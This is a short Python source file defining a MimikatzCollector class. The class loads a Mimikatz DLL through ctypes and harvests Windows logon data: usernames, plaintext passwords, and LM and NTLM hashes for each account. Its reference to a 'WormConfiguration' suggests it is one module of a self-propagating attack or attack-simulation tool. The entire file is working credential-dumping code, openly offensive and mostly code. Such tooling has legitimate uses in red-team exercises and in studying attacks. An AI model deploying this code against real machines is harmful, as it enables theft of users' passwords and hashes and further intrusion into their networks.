import ctypes
import binascii
import logging

__author__ = 'itay.mizeretz'

LOG = logging.getLogger(__name__)




class MimikatzCollector:
    """
    Password collection module for Windows using Mimikatz.
    """

    def __init__(self):
        try:
            self._isInit = False
            self._config = __import__('config').WormConfiguration
            self._dll = ctypes.WinDLL(self._config.mimikatz_dll_name)
            collect_proto = ctypes.WINFUNCTYPE(ctypes.c_int)
            get_proto = ctypes.WINFUNCTYPE(MimikatzCollector.LogonData)
            self._collect = collect_proto(("collect", self._dll))
            self._get = get_proto(("get", self._dll))
            self._isInit = True
        except StandardError as ex:
            LOG.exception("Error initializing mimikatz collector")

    def get_logon_info(self):
        """
        Gets the logon info from mimikatz.
        Returns a dictionary of users with their known credentials.
        """

        if not self._isInit:
            return {}

        try:
            entry_count = self._collect()

            logon_data_dictionary = {}

            for i in range(entry_count):
                entry = self._get()
                username = str(entry.username)
                password = str(entry.password)
                lm_hash = binascii.hexlify(bytearray(entry.lm_hash))
                ntlm_hash = binascii.hexlify(bytearray(entry.ntlm_hash))
                has_password = (0 != len(password))
                has_lm = ("00000000000000000000000000000000" != lm_hash)
                has_ntlm = ("00000000000000000000000000000000" != ntlm_hash)

                if not logon_data_dictionary.has_key(username):
                    logon_data_dictionary[username] = {}
                if has_password:
                    logon_data_dictionary[username]["password"] = password
                if has_lm:
                    logon_data_dictionary[username]["lm_hash"] = lm_hash
                if has_ntlm:
                    logon_data_dictionary[username]["ntlm_hash"] = ntlm_hash

            return logon_data_dictionary
        except StandardError as ex:
            LOG.exception("Error getting logon info")
            return {}

    class LogonData(ctypes.Structure):
        """
        Logon data structure returned from mimikatz.
        """
        _fields_ = \
            [
                ("username",    ctypes.c_wchar * 257),
                ("password",    ctypes.c_wchar * 257),
                ("lm_hash",     ctypes.c_byte * 16),
                ("ntlm_hash",   ctypes.c_byte * 16)
            ]
